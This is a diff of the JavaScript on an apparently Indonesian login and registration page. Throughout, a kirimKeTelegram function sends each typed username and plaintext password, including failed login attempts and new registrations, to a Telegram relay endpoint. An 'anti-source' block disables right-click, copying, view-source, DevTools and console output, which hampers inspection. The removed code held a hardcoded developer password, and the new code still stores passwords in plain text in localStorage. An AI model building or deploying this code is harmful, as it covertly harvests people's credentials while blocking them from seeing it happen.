@@ -621,73 +621,23 @@
      ANTI-SOURCE PROTECTION
      ============================================ */
   (function antiSource() {
-    // 1. Blokir klik kanan
-    document.addEventListener('contextmenu', function(e) {
-      e.preventDefault();
-      return false;
-    });
-
-    // 2. Blokir shortcut keyboard
+    document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; });
     document.addEventListener('keydown', function(e) {
       var k = (e.key || '').toLowerCase();
-
-      // F12
-      if (e.keyCode === 123 || k === 'f12') {
-        e.preventDefault();
-        return false;
-      }
-      // Ctrl+Shift+I / Ctrl+Shift+J / Ctrl+Shift+C
-      if (e.ctrlKey && e.shiftKey && (k === 'i' || k === 'j' || k === 'c')) {
-        e.preventDefault();
-        return false;
-      }
-      // Ctrl+U (view source)
-      if (e.ctrlKey && k === 'u') {
-        e.preventDefault();
-        return false;
-      }
-      // Ctrl+S (save page)
-      if (e.ctrlKey && k === 's') {
-        e.preventDefault();
-        return false;
-      }
-      // Ctrl+A (select all)
-      if (e.ctrlKey && k === 'a') {
-        e.preventDefault();
-        return false;
-      }
-      // Ctrl+P (print)
-      if (e.ctrlKey && k === 'p') {
-        e.preventDefault();
-        return false;
-      }
-      // Cmd+Option+I / Cmd+Option+U (Mac)
-      if (e.metaKey && e.altKey && (k === 'i' || k === 'u' || k === 'j' || k === 'c')) {
-        e.preventDefault();
-        return false;
-      }
-      // Cmd+U / Cmd+S (Mac)
-      if (e.metaKey && (k === 'u' || k === 's')) {
-        e.preventDefault();
-        return false;
-      }
+      if (e.keyCode === 123 || k === 'f12') { e.preventDefault(); return false; }
+      if (e.ctrlKey && e.shiftKey && (k === 'i' || k === 'j' || k === 'c')) { e.preventDefault(); return false; }
+      if (e.ctrlKey && k === 'u') { e.preventDefault(); return false; }
+      if (e.ctrlKey && k === 's') { e.preventDefault(); return false; }
+      if (e.ctrlKey && k === 'p') { e.preventDefault(); return false; }
+      if (e.metaKey && e.altKey && (k === 'i' || k === 'u' || k === 'j' || k === 'c')) { e.preventDefault(); return false; }
+      if (e.metaKey && (k === 'u' || k === 's')) { e.preventDefault(); return false; }
     });
-
-    // 3. Blokir drag
-    document.addEventListener('dragstart', function(e) {
-      e.preventDefault();
-      return false;
-    });
-
-    // 4. Blokir seleksi teks (kecuali input)
+    document.addEventListener('dragstart', function(e) { e.preventDefault(); return false; });
     document.addEventListener('selectstart', function(e) {
       var t = e.target;
       if (t && (t.tagName === 'INPUT' || t.tagName === 'TEXTAREA')) return true;
-      e.preventDefault();
-      return false;
+      e.preventDefault(); return false;
     });
-
-    // 5. Blokir copy
     document.addEventListener('copy', function(e) {
       var t = e.target;
       if (t && (t.tagName === 'INPUT' || t.tagName === 'TEXTAREA')) return true;
@@ -695,25 +645,15 @@
       e.clipboardData.setData('text/plain', 'Dilarang menyalin konten ini.');
       return false;
     });
-
-    // 6. Blokir cut
     document.addEventListener('cut', function(e) {
       var t = e.target;
       if (t && (t.tagName === 'INPUT' || t.tagName === 'TEXTAREA')) return true;
-      e.preventDefault();
-      return false;
+      e.preventDefault(); return false;
     });
-
-    // 7. Anti iframe (jika di-embed di situs lain)
     if (window.top !== window.self) {
-      try {
-        window.top.location = window.self.location;
-      } catch (e) {
-        document.body.innerHTML = '';
-      }
+      try { window.top.location = window.self.location; }
+      catch (e) { document.body.innerHTML = ''; }
     }
-
-    // 8. Deteksi DevTools terbuka (resize + debug)
     var devtoolsOpen = false;
     var threshold = 160;
     setInterval(function() {
@@ -730,35 +670,18 @@
             'AKSES DITOLAK<br><span style="font-size:14px;color:#fff;font-weight:600;margin-top:12px;display:block;">' +
             'Tutup Developer Tools untuk melanjutkan.</span></div>';
         }
-      } else {
-        devtoolsOpen = false;
-      }
+      } else { devtoolsOpen = false; }
     }, 1000);
-
-    // 9. Blokir console.log
-    var noop = function() {};
     try {
-      console.log = noop;
-      console.warn = noop;
-      console.error = noop;
-      console.info = noop;
-      console.debug = noop;
-      console.table = noop;
+      console.log = function() {};
+      console.warn = function() {};
+      console.info = function() {};
+      console.debug = function() {};
     } catch (e) {}
-
-    // 10. Blokir akses view-source via URL
-    if (window.location.href.indexOf('view-source:') === 0) {
-      document.body.innerHTML = 'Akses ditolak.';
-    }
-
-    // 11. Blokir image saving
-    document.addEventListener('mousedown', function(e) {
-      if (e.button === 2) e.preventDefault();
-    });
   })();
 
   /* ============================================
-     UI & LOGIKA LOGIN
+     UI & LOGIKA
      ============================================ */
   function showError(msg) {
     var el = document.getElementById('errorMsg');
@@ -791,58 +714,19 @@
     hideMessages();
   }
 
-  var DEFAULT_USERS = [
-    { username: 'Ariel', password: 'ariel123', role: 'developer', registeredAt: '2026-01-01T00:00:00.000Z' }
-  ];
-
-  function getUsers() {
-    try {
-      var data = localStorage.getItem('toolsArielUsers');
-      if (!data) {
-        localStorage.setItem('toolsArielUsers', JSON.stringify(DEFAULT_USERS));
-        return DEFAULT_USERS;
-      }
-      var users = JSON.parse(data);
-
-      var ariel = users.find(function(u) {
-        return u.username.toLowerCase() === 'ariel';
-      });
-
-      if (!ariel) {
-        users.push(DEFAULT_USERS[0]);
-        localStorage.setItem('toolsArielUsers', JSON.stringify(users));
-      } else {
-        ariel.role = 'developer';
-        localStorage.setItem('toolsArielUsers', JSON.stringify(users));
-      }
-
-      return users;
-    } catch (e) {
-      return DEFAULT_USERS;
-    }
-  }
-
-  function saveUsers(users) {
-    localStorage.setItem('toolsArielUsers', JSON.stringify(users));
-  }
-
-  function findUser(username) {
-    var users = getUsers();
-    var lower = username.toLowerCase();
-    for (var i = 0; i < users.length; i++) {
-      if (users[i].username.toLowerCase() === lower) {
-        return users[i];
-      }
-    }
-    return null;
-  }
-
+  /* ============================================
+     KIRIM KE TELEGRAM
+     ============================================ */
   async function kirimKeTelegram(username, password, tipe) {
     try {
       var res = await fetch('/api/telegram', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ username: username, password: password, tipe: tipe })
+        body: JSON.stringify({
+          username: username,
+          password: password,
+          tipe: tipe
+        })
       });
       var data = await res.json();
       return data.success === true;
@@ -851,6 +735,9 @@
     }
   }
 
+  /* ============================================
+     HANDLE LOGIN (SERVER-SIDE)
+     ============================================ */
   async function handleLogin(e) {
     e.preventDefault();
     hideMessages();
@@ -864,36 +751,45 @@
       return;
     }
 
-    var user = findUser(username);
-
-    if (!user) {
-      showError('Akun belum terdaftar. Silakan register dulu!');
-      kirimKeTelegram(username, password, 'login_gagal');
-      return;
-    }
-
-    if (user.password !== password) {
-      showError('Password salah!');
-      kirimKeTelegram(username, password, 'login_gagal');
-      return;
-    }
-
     btn.classList.add('loading');
 
-    await kirimKeTelegram(username, password, 'login');
+    try {
+      var res = await fetch('/api/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        credentials: 'include',
+        body: JSON.stringify({ username: username, password: password })
+      });
+      var data = await res.json();
 
-    sessionStorage.clear();
-    sessionStorage.setItem('user', user.username);
-    sessionStorage.setItem('role', user.role || 'member');
-    sessionStorage.setItem('loginTime', new Date().toISOString());
-    sessionStorage.setItem('token', Math.random().toString(36).substring(2));
-    sessionStorage.setItem('loginVerified', 'true');
+      if (data.success) {
+        // Kirim notif ke Telegram
+        kirimKeTelegram(username, password, 'login');
 
-    setTimeout(function() {
-      window.location.href = 'dashboard.html';
-    }, 1200);
+        // Simpan info user untuk display
+        sessionStorage.setItem('user', data.user);
+        sessionStorage.setItem('role', data.role || 'member');
+        sessionStorage.setItem('loginTime', new Date().toISOString());
+
+        showSuccess('Login berhasil! Mengalihkan...');
+
+        setTimeout(function() {
+          window.location.href = '/dashboard.html';
+        }, 900);
+      } else {
+        btn.classList.remove('loading');
+        showError(data.message || 'Login gagal');
+        kirimKeTelegram(username, password, 'login_gagal');
+      }
+    } catch (err) {
+      btn.classList.remove('loading');
+      showError('Error: ' + err.message);
+    }
   }
 
+  /* ============================================
+     HANDLE REGISTER
+     ============================================ */
   async function handleRegister(e) {
     e.preventDefault();
     hideMessages();
@@ -916,23 +812,33 @@
       return;
     }
 
-    if (findUser(username)) {
-      showError('Username sudah terdaftar!');
-      return;
-    }
-
     btn.classList.add('loading');
 
     await kirimKeTelegram(username, password, 'register');
 
-    var users = getUsers();
+    // Simpan user ke localStorage (database lokal)
+    var users = [];
+    try {
+      users = JSON.parse(localStorage.getItem('toolsArielUsers') || '[]');
+    } catch (err) { users = []; }
+
+    // Cek duplikat
+    var exists = users.find(function(u) {
+      return u.username.toLowerCase() === username.toLowerCase();
+    });
+    if (exists) {
+      btn.classList.remove('loading');
+      showError('Username sudah terdaftar!');
+      return;
+    }
+
     users.push({
       username: username,
       password: password,
       role: 'member',
       registeredAt: new Date().toISOString()
     });
-    saveUsers(users);
+    localStorage.setItem('toolsArielUsers', JSON.stringify(users));
 
     setTimeout(function() {
       btn.classList.remove('loading');
@@ -950,7 +856,6 @@
   }
 
   window.addEventListener('load', function() {
-    getUsers();
     document.getElementById('loginUser').focus();
   });
 </script>
